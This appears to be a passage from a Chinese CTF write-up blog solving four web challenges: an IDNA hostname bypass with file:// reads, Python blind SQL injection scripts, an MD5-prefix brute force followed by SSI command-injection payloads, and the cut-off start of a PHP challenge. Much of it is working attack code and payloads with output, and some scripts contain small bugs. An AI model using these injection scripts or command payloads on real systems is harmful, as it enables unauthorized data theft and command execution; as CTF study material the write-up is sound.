<h2 id="7-SUCTF-2019-Pythonginx"><a href="#7-SUCTF-2019-Pythonginx" class="headerlink" title="7.[SUCTF 2019]Pythonginx"></a>7.[SUCTF 2019]Pythonginx</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">@app.route(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]) <br>def getUrl(): <br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>) <br>    host = parse.urlparse(url).hostname  <span class="hljs-comment">#解析主机名</span><br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span> <br>    parts = <span class="hljs-keyword">list</span>(urlsplit(url)) <br>    host = parts[<span class="hljs-number">1</span>] <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host <br>    newhost = [] <br>    <span class="hljs-keyword">for</span> h in host.split(<span class="hljs-string">&#x27;.&#x27;</span>): <br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <br>        parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#去掉 url 中的空格 </span><br>        finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># 将主机名再次组合成 url</span><br>        host = parse.urlparse(finalUrl).hostname <br>        <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>            <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span> <br></code></pre></td></tr></table></figure>

<p>前两个 if 判断 host是否含有 suctf.cc 如果有就报错，经过 utf-8 解码 idna 编码 之后传入到 urlunsplit函数 组合成url ，再用 if 和suctf.cc进行一次比较 如果相同 就 进行读取。</p>
<p>我们先了解下 idna<br>idna 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以<br>ASCII字符串存储。<br>.<br>℆这个字符,如果使用python3进行idna编码的话<br>print(‘℆’.encode(‘idna’))<br>结果<br>b’c/u’<br>如果再使用utf-8进行解码的话<br>print(b’c/u’.decode(‘utf-8’))<br>结果<br>c/u<br>通过这种方法可以绕过本题</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx">nginx目录：<br>配置文件存放目录：/etc/<span class="hljs-attribute">nginx</span><br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf<br>得到：<br>server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;<br><br>getUrl?url=file://suctf.c℆sr/fffffflag<br>得到：<br>flag&#123;2baa12f7-2b11-4be9-8e94-1a34b2b50ecf&#125;<br></code></pre></td></tr></table></figure>

<h2 id="8-极客大挑战-2019-FinalSQL"><a href="#8-极客大挑战-2019-FinalSQL" class="headerlink" title="8.[极客大挑战 2019]FinalSQL"></a>8.[极客大挑战 2019]FinalSQL</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php?id=&#x27;</span><br>dblen = <span class="hljs-string">&#x27;1^(length(database())=&#x27;</span>   <span class="hljs-comment"># final 4</span><br><br>dbname = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#x27;</span>  <span class="hljs-comment">#geek</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+dbname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br><br><br>tblen = <span class="hljs-string">&#x27;1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=i)&#x27;</span><br><span class="hljs-comment">#i=16</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    finurl = url+tblen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>        <br>        <br>tbname = <span class="hljs-string">&#x27;1^(ascii(substr(select(group_concat(table_name))&#x27;</span> \<br>        <span class="hljs-string">&#x27;from(information_schema.tables)where(table_schema=&quot;dbname&quot;),i,1))=j)&#x27;</span><br><span class="hljs-comment">#F1naI1y,Flaaaaag</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">17</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+tbname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br>            <br><br>colulen = <span class="hljs-string">&#x27;1^((select(length(group_concat(COLUMN_NAME)))&#x27;</span> \<br>          <span class="hljs-string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;))=i)&#x27;</span><br><span class="hljs-comment">#Flaaaaag 11 F1naI1y20</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    finurl = url+colulen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>        <br>        <br>coluname = <span class="hljs-string">&#x27;1^(ascii(substr(select(group_concat(column_name))&#x27;</span> \<br>           <span class="hljs-string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;),i,1))=j)&#x27;</span><br><span class="hljs-comment">#Flaaaaag--id,fl4gawsl</span><br><span class="hljs-comment">#F1naI1y--id,username,password</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+coluname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br><br>valulen = <span class="hljs-string">&#x27;1^((select(length(group_concat(coluname)))from(tbname))=213)&#x27;</span><br><span class="hljs-comment">#213</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    finurl = url+valulen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><br><br>value = <span class="hljs-string">&#x27;1^(ascii(substr((select(group_concat(coluname))from(tbname)),i,1))=j)&#x27;</span><br><span class="hljs-comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.tmp,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_nee[_a_grilfriend,flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span><br><br><span class="hljs-comment">#flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span><br>num = <span class="hljs-number">1</span><br>url1 = <span class="hljs-string">&#x27;,1))=&#x27;</span><br><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>,<span class="hljs-number">214</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        finurl = url+value+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br>            <br>            <br><span class="hljs-comment">#for循环跑的好慢好慢，需要用------二分法，快的一批</span><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-comment"># 中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断</span><br>        <span class="hljs-comment"># 查数据库</span><br>        database = <span class="hljs-string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)<br>        <span class="hljs-comment"># 查表</span><br>        tables = <span class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)<br>        columns = <span class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)<br>        data = <span class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)<br>        <span class="hljs-comment"># 根据需要查询的内容改变get中的参数</span><br>        r = requests.get(url=url+database)<br>        <span class="hljs-comment"># print(url+database)</span><br>        <span class="hljs-comment"># print(payload1)</span><br>        <span class="hljs-comment"># print(r.raw)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Click&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        <span class="hljs-comment"># print(low,mid,high)</span><br>    flag += <span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>

<h2 id="9-BJDCTF2020-EasySearch"><a href="#9-BJDCTF2020-EasySearch" class="headerlink" title="9.[BJDCTF2020]EasySearch"></a>9.[BJDCTF2020]EasySearch</h2><p>在首界面审查源代码、抓包未获取到有效信息，就开始进行目录扫描，获取到index.php.swp文件，结果如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	ob_start();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>	***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>	***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python 跑出来一个</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000000</span>):<br>    md5 = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> md5[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;success!&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-built_in">hash</span>.digest() ：返回摘要，作为二进制数据字符串值<br><span class="hljs-built_in">hash</span>.hexdigest()：返回摘要，作为十六进制数据字符串值<br>hashlib.md5(<span class="hljs-string">&#x27;2020666&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))：<br>    &lt;md5 HASH <span class="hljs-built_in">object</span> @ <span class="hljs-number">0x000001DAE7237DD0</span>&gt;<br><br>hashlib.md5(<span class="hljs-string">&#x27;2020666&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()：<br>	6d0bc1153791aa2b4e18b4f344f26ab4<br><br></code></pre></td></tr></table></figure>

<p>我们观察到页面需要显示：      </p>
<p>SSI 注入全称Server-Side Includes Injection（服务端包含注入），ssi可以赋予html静态页面的动态效果，通过ssi执行命令，返回对应的结果，当在网站目录中发现了.stm .shtm .shtml或在界面中发现了就容易产生ssi注入，此处问题的其注入格式为：<!--#exec cmd="命令" --></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17035775.html">SSI学习</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><br>&lt;所以这里存在一个注入点&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;$what&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;%$a%&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>payload:    <br><span class="hljs-comment">&lt;!--#exec cmd=&quot;命令&quot; --&gt;</span><br><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br>    Hello,052f5d5cb988c12c5054146e8e62133793164e04.shtml 277daf029727c9cbe7acc31d7840353a65fc8e9f.shtml 2b88015534a75975d2f8f95ba084719b8274e017.shtml 2dc1b67c1009e4a8f9d9af70f3d875eb15d94e87.shtml<br>    ……………………………………<br><span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span><br>    Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public<br><br><span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span><br>	Hello,flag&#123;865df233-2a82-48be-b90c-8d87005a8007&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="10-0CTF-2016-piapiapia"><a href="#10-0CTF-2016-piapiapia" class="headerlink" title="10.[0CTF 2016]piapiapia"></a>10.[0CTF 2016]piapiapia</h2><p>search扫描发现有一个<a href="http://www.zip的压缩包，下载下来后有：index.php">www.zip的压缩包，下载下来后有：index.php</a> register.php config.php update.php profile.php class.php</p>
<p>注意到只有config.php里面包含有flag的信息，所以我们需要想办法将其文件包含出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>	<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br>	<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>注意到profile.php界面是将这些变量直接输出的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top:100px&quot;</span>&gt;</span>  <br>	<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-memeda &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Hi &lt;?php echo $nickname;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Phone: &lt;?php echo $phone;?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Email: &lt;?php echo $email;?&gt;<span class="hljs-tag">&lt;/<span 